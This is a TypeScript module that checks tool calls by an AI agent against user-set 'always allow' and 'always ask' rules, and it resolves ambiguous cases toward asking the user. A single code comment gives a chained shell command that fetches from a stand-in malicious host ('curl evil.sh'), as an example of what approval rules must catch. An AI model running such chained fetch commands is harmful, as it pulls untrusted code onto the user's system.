/**
 * Standing approval rules (table `tool_rules`, migration v31): the persistent
 * answer to "always allow this" — and its counterweight, "always ask about
 * this". This module is the pure matching half; storage lives in
 * db/repositories/tool-rules.ts and enforcement in executor.ts.
 *
 * Two invariants shape everything here:
 *
 * 1. A matching 'require_approval' rule ALWAYS wins — over another rule, over
 *    a standing grant, and over an 'always_allow' tool permission. Allow rules
 *    only ever remove a dialog; they can never widen what a tool may do
 *    ('deny', plan mode, the read-only sandbox and noStandingApproval tools
 *    still refuse first, in executor.ts).
 *
 * 2. Ambiguity resolves toward asking. A pattern the matcher cannot evaluate
 *    (a tool with no subject, an unparseable URL) makes a stop rule match and
 *    an allow rule miss — never the other way round. So a half-understood rule
 *    costs the user a dialog rather than an unreviewed action.
 */

import type { ToolRule, ToolRuleEffect } from '@shared/types'
import { TOOL_RULE_SUBJECTS } from '@shared/tool-rules'
import { commandMatchesAllowlist, hasShellChaining } from './shell-allowlist'

/**
 * The value a rule's pattern is matched against for this call, or null when
 * the tool has no narrowable subject (or the argument is missing/not a string).
 */
export function ruleSubject(toolId: string, args: Record<string, unknown>): string | null {
  const subject = TOOL_RULE_SUBJECTS[toolId]
  if (!subject) return null
  const value = args[subject.arg]
  return typeof value === 'string' && value.trim().length > 0 ? value : null
}

/** Collapses separators and trailing slashes so path patterns compare cleanly. */
function normalizePath(value: string): string {
  return value.replace(/\\/g, '/').replace(/\/+$/, '').trim()
}

/** null = the subject is not a URL at all, so the pattern cannot be judged. */
function hostMatches(pattern: string, subject: string): boolean | null {
  let host: string
  try {
    host = new URL(subject).hostname.toLowerCase()
  } catch {
    return null
  }
  const wanted = pattern.trim().toLowerCase().replace(/^\*\./, '')
  if (wanted.length === 0) return false
  // A bare host matches its subdomains too ("example.com" covers
  // "docs.example.com"), which is also what the "*.example.com" spelling means.
  return host === wanted || host.endsWith(`.${wanted}`)
}

/**
 * null = the command chains or substitutes, so prefix matching cannot say what
 * it will actually run. That is precisely the case an "always ask" rule must
 * still catch: `npm publish; curl evil.sh` must not slip past a rule written
 * for `npm publish` simply because the prefix matcher refuses to match it.
 */
function commandMatches(pattern: string, subject: string): boolean | null {
  if (hasShellChaining(subject)) return null
  return commandMatchesAllowlist(subject, [pattern])
}

function pathMatches(pattern: string, subject: string): boolean {
  const prefix = normalizePath(pattern)
  const target = normalizePath(subject)
  if (prefix.length === 0) return false
  if (target === prefix) return true
  // Only at a segment boundary: "src/gen" must not cover "src/generated".
  return target.startsWith(`${prefix}/`)
}

/**
 * Whether `pattern` covers this call. Returns null when the pattern cannot be
 * evaluated at all (no subject for this tool, or an unparseable one), which
 * the caller resolves in the fail-safe direction.
 */
function patternCovers(
  toolId: string,
  pattern: string,
  args: Record<string, unknown>
): boolean | null {
  const subject = TOOL_RULE_SUBJECTS[toolId]
  if (!subject) return null
  const value = ruleSubject(toolId, args)
  if (value === null) return null
  if (subject.kind === 'command') return commandMatches(pattern, value)
  if (subject.kind === 'url') return hostMatches(pattern, value)
  // A path is always evaluable — there is no unparseable spelling of one.
  return pathMatches(pattern, value)
}

export interface ToolRuleMatchContext {
  /** Definition id of the tool being called. */
  toolId: string
  conversationId: string
  /** Project the conversation is working in, for project-scoped rules. */
  projectId?: string | null
  /** Parsed arguments of this call, for pattern matching. */
  args: Record<string, unknown>
}

function scopeApplies(rule: ToolRule, ctx: ToolRuleMatchContext): boolean {
  if (rule.scope === 'global') return true
  if (rule.scope === 'conversation') return rule.scopeId === ctx.conversationId
  if (rule.scope === 'project') return rule.scopeId !== null && rule.scopeId === ctx.projectId
  return false
}

function ruleApplies(rule: ToolRule, ctx: ToolRuleMatchContext): boolean {
  if (rule.toolId !== ctx.toolId) return false
  if (!scopeApplies(rule, ctx)) return false
  const pattern = rule.pattern?.trim() ?? ''
  if (pattern.length === 0) return true
  const covered = patternCovers(ctx.toolId, pattern, ctx.args)
  // Un-evaluable pattern: stop rules match anyway, allow rules do not.
  if (covered === null) return rule.effect === 'require_approval'
  return covered
}

/**
 * The effect of the user's standing rules on this call: 'require_approval'
 * (always ask), 'allow' (skip the dialog), or null when no rule applies.
 * A single matching stop rule outranks any number of allow rules.
 */
export function matchToolRules(
  rules: readonly ToolRule[],
  ctx: ToolRuleMatchContext
): ToolRuleEffect | null {
  let allow = false
  for (const rule of rules) {
    if (!ruleApplies(rule, ctx)) continue
    if (rule.effect === 'require_approval') return 'require_approval'
    allow = true
  }
  return allow ? 'allow' : null
}
